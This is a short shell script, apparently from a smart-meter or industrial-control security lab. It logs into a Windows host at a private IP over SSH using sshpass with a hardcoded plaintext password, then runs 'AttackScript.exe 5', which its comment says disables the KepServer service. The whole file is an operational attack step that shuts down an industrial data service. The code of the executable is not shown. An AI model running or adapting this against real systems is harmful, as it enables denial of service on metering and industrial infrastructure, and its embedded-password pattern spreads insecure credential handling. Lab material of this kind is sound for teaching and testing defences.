#!/bin/sh

# Description: This file/script demostrates the disabling of KepServer Service on the remote Windows Host
# Tag: Disable Smart Meter Service   
sshpass -p 'Student12345@' ssh student@172.16.2.223 -o ConnectTimeout=5 "C:\Windows\Temp\SmartMetertest\AttackScript.exe 5"
